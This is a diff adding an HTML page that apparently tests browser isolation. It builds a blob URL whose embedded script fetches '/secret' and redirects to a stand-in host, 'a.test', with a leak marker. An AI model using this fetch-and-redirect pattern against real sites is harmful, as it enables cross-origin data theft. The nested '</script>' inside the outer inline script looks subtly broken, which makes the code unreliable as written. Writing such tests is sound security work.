@@ -1,0 +1,25 @@
+<html>
+  <body>
+    <script>
+      // Create a blob URI containing malicious HTML that tries to access /secret
+      var blobContent = `
+        <script>
+          fetch('/secret')
+            .then(response => response.text())
+            .then(secret => {
+              alert(secret);
+              location.href = 'https://a.test/report/?leak=c1115628';
+            });
+        </script>
+      `;
+
+      // Use Blob and URL.createObjectURL to create a blob URL
+      var blob = new Blob([blobContent], { type: 'text/html' });
+      var blobURL = URL.createObjectURL(blob);
+
+      // Set the top frame location to the blob URL
+      // This simulates replacing the top-level document
+      top.location = blobURL;
+    </script>
+  </body>
+</html>
